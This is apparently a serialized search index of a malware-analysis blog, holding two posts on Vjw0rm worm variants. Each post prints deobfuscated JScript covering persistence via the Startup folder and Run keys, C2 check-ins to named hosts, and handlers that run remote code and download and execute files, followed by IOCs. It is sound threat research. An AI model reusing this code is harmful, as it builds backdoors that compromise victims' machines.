","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:1:0","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"Metadata: Sample: 3236312b9dc691dd8b9214f08ff01e5d ","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:2:0","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"Analysis The obfuscation techniques are pretty standard, the first stage deobfuscates base64 data then performs mathematic operations on it (I don’t give a crap how they work I just let it do the heavy lifting for me), interestingly the base64 string is reversed. After this then the obfuscation consistently used eval which is easily replaced with console.log and ran using nodejs to dump the next stages. It took approximatly twenty different times dumping the obfuscated code before I was able to access the deobfuscated code. The script starts with setting up some global variables the script needs to run then makes a call to ModinySks(), this function is responsible to establishing persistence. var shell = new ActiveXObject('WScript.Shell'); var fstym = new ActiveXObject('Scripting.FileSystemObject'); var spl = '|V|'; var Ch = '\\\\'; var verss = 'viperSoftx_1.0.7.6'; var VN = verss + '_' + getSerial(); var Startup = getEnv('appdata') + '\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\'; var StartupAll = getEnv('allusersprofile') + '\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\'; var Temp = getEnv('temp') + '\\\\'; var Desktop = getEnv('userProfile') + '\\\\Desktop\\\\'; var AppData = getEnv('appdata') + '\\\\'; var fxDmE4zu = WScript.ScriptFullName; var wn = WScript.ScriptName; var UDex; var DeLay = 20; var ps = 'powershell.exe'; var batf = AppData + wn + '.bat'; var vbsf = AppData + wn + '.vbs'; var lnkf = Startup + wn + '.lnk'; ModinySks(); We can see that powershell.exe is used to copy, the backdoor script to the %AppData% folder then establishing persistence in the startup folder as a LNK file. function ModinySks() { try { shell.Run(ps + \" Copy-Item -Path '\" + fxDmE4zu + \"' -Destination '\" + AppData + wn + \"'\", 0, false); var newpato = 'start wscript.exe /E:jscript \"\"\"' + AppData + wn + '\"\"\"'; CreateFile(vbsf, 'Set WshShell = WScript.CreateObject(\"\"\"WScript.Shell\"\"\")' + '\\n' + 'obj = WshShell.Run(\"\"\"wscript.exe /E:jscript \"\"\"\"\"\"' + AppData + wn + '\"\"\"\"\"\"\"\"\", 0)' + '\\n' + 'set WshShell = Nothing'); createShort(lnkf, vbsf); } catch (err) { } } After persistence is achieved, it will checkin to the C2 server seko[.]vipers[.]pw:8880, send fingerprinting data in the User-Agent. Interestingly, this variant adds the X-Header HTTP header with the variant prefix / version as well. function SendHttp(R) { var X = new ActiveXObject('Microsoft.XMLHTTP'); X.open('put', 'http://seko.vipers.pw:8880/connect', false); var useragent = getUserAgent(); X.SetRequestHeader('User-Agent:', useragent); X.SetRequestHeader('X-Header:', VN); X.send(R); return X.responsetext; } The C2 server response body will be parsed by use of the delimiter |V| much like previous variants. var send = SendHttp(); var Command = send.split(spl); var order = Command[0]; var order_data = Command[1]; ","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:3:0","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"C2 Command (Ex): Code: if (order === 'Ex') { eval(order_data); } Command from C2: Ex|V|\u003cjscript_code\u003e ","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:3:1","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"C2 Command (Cmd): Code: if (order === 'Cmd') { shell.Run(order_data, 0, false); } Command from C2: Cmd|V|whoami ","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:3:2","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"C2 Command (DwnlExe): Code: if (order === 'DwnlExe') { var path = Temp + Command[2]; DownFile(Command[1], path, true); WScript.Sleep(DeLay * 1000); shell.Run(\"cmd.exe start '\" + path + \"'\", 0, false); } Command from C2: DwnlExe|V|\u003curl\u003e|V|\u003cpath\u003e ","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:3:3","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"C2 Command (DwnlOnly): Code: if (order === 'DwnlOnly') { varpathdwn = ''; var path = Command[3]; var exe = Command[4]; if (path == 'startup') { pathdwn = Startup + Command[2]; } else if (path == 'temp') { pathdwn = Temp + Command[2]; } else if (path == 'desktop') { pathdwn = Desktop + Command[2]; } else { pathdwn = path + Command[2]; } if (pathdwn != '') { if (exe == 'yes') { DownFile(Command[1], pathdwn, true); WScript.Sleep(DeLay * 1000); shell.Run(ps + \" start '\" + pathdwn + \"'\", 0, false); } else { DownFile(Command[1], pathdwn, false); } } } ","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:3:4","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"C2 Command (SelfRemove): Code: if (order === 'SelfRemove') { UnMonkSek(true); } ","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:3:5","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"C2 Comamnd (UpdateS): if (order === 'UpdateS') { var path = Temp + Command[2]; DownFile(Command[1], path, true); if (fstym.fileexists(path)) { UnMonkSek(false); WScript.Sleep(DeLay * 1000); shell.Run(ps + \" start wscript.exe /E:jscript '\" + path + \"'\", 0, false); WScript.Quit(1); } } Command from C2: UpdateS|V|\u003curl\u003e|V|\u003ctmp_file_name\u003e ","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:3:6","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"C2 Checkin Traffic: PUT /connect HTTP/1.1 Accept: */* Accept-Language: en-us User-Agent: viperSoftx_1.0.7.6_C4BA3647\\USER-PC\\Admin\\Microsoft Windows 7 Professional [32]\\\\YES\\undefined\\ x-header: viperSoftx_1.0.7.6_C4BA3647 Accept-Encoding: gzip, deflate Host: seko.vipers.pw:8880 Content-Length: 0 Connection: Keep-Alive Cache-Control: no-cache If you look closely the difference are the use of the PUT HTTP method and the use of the x-header. This is easy enough to create detection for. ","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:3:7","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"IOCS: 3236312b9dc691dd8b9214f08ff01e5d seko.vipers.pw ","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:4:0","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"References: Deobfuscated Samples Any.Run VirusTotal ","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/:5:0","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"An interesting analysis of a Vjw0rm variant","date":"2020-02-01","objectID":"/2020/02/vjw0rm-mr-robot-variant/","tags":["Vjw0rm","Worm"],"title":"Mr. Robot Variant of Vjw0rm","uri":"/2020/02/vjw0rm-mr-robot-variant/"},{"categories":["Malware"],"content":"I was monitoring Any.Run when a .js file peeked my interest due to the limited network traffic. Analysis Metadata: Name: 1.js MD5 : 3f438e857c45a4812dbfa331fd3b8011 The first stage decrypts a long Unicode string then calls eval on its result as seen in Figure 1. function y(o,h) { var t;var s=\"\"; var d=(o+\"\").split(\"\"); for (var i=0;i\u003cd.length;i++){ t=d[i].charCodeAt(0); s+=String.fromCharCode(256-+t+(+h)); } return s; } WScript.Sleep(10000); eval(\"eval(y(\\\"\u003clong_unicode_string\u003e\\\"\"); Figure 1: Deobfuscation routine When threat actor(s) use eval, most of the time I can easily bypass this with replacing it with console.log and using nodejs to do the heavy lifting for us. In our case here this is exactily what I did with removing the sleep and replacing eval with console.log. After the script is run with modifications it is possible to obtain the pseudo deobfuscated code. This means that the contents are still obfuscated to make it difficult for reading however we can identify some key functionality. In this case most of the strings are stored in an array with the variable _0x4ba2. This will have to be deobfuscated by hand as seen in Figure 2. try { U = sh[_0xb4af('0xd')](g[2]); } catch (_0x55fd01) { var sv = fu[_0xb4af('0xe')]('\\\\'); if (':\\\\' + sv[1] == ':\\\\' + wn) { U = _0xb4af('0xf'); sh['RegWrite'](g[2], U, g[5]); } else { U = _0xb4af('0x10'); sh[_0xb4af('0x11')](g[2], U, g[5]); } } Ns(); Figure 2: Obfuscated result To achieve this I renamed the variable and simplified the code so its easily human readable. Vjw0rm will first check for the registry key HKCU\\\\vjw0rm if the value is TRUE or FALSE to determine if the machine is already infected or not and will then run the Install() routine as seen in Figure 3. try{ is_installed = sh['RegRead']('HKCU\\\\vjw0rm'); } catch(_0x55fd01){ var sv = fu['split']('\\x5c'); if(':\\x5c' + sv[0x1] == ':\\x5c' + script_name){ is_installed = 'TRUE'; sh['RegWrite']('HKCU\\\\vjw0rm', is_installed, 'REG_SZ'); } else{ is_installed = 'FALSE'; sh['RegWrite']('HKCU\\\\vjw0rm', is_installed, 'REG_SZ'); } } Install(); Figure 3: Check if installed The install routine will copy the script to the %TEMP% directory then establish persistence by setting the registry key HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\WEW2BF0U0A with the value being the path to vjw0rm as seen in Figure 4. function Install(){ var worm_file = GetEnv('TEMP') + char_backslash + script_name; try{ fs['CopyFile'](fu, worm_file, !![]); } catch(_0x349bb9){} try{ sh['RegWrite']('HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\WEW2BF0U0A', '\\x22' + worm_file + '\\x22', 'REG_SZ'); }catch(_0x58ded7){} try{ var shell_app = GetActiveXObject(ACTIVEX_OBJECT_SHELL_APPLICATION); fs['CopyFile'](fu, shell_app['NameSpace'](0x7)['Self']['Path'] + '\\x5c' + script_name, !![]); }catch(_0x151660){} } Figure 4: Vjw0rm Persistence / Installation After installation has completed it will send a HTTP POST request to the C2 server updatefacebook.ddns.net:6. Information of the victim machiine will be supplied to the C2 server by providing it in the User-Agent header. The traffic will look like the following: POST /Vre HTTP/1.1 Host: updatefacebook.ddns.net:6 User-Agent: MR_ROBOT_18d0-EEF8\\COMPUTER-NAME\\USERNAME\\caption\\FullName\\\\TRUE\\TRUE\\ The User-Agent contains the campaign prefix, drive id, computer-name, username, caption, full name, TRUE/FALSE (if visual basic compiler present), TRUE/FALSE (if Vjw0rm is installed). This variant has several command options, Sc (write file to disk and run it), Ex (run additional JSCript code), Rn (rename the UUID), Up (Run code w/ WScript), and RF (run file). Analysis files for this sample can be downloaded here. The password to all ZIP archives on this site is infected. Thank you, References Any.Run VirusTotal ","date":"2020-02-01","objectID":"/2020/02/vjw0rm-mr-robot-variant/:0:0","tags":["Vjw0rm","Worm"],"title":"Mr. Robot Variant of Vjw0rm","uri":"/2020/02/vjw0rm-mr-robot-variant/"}]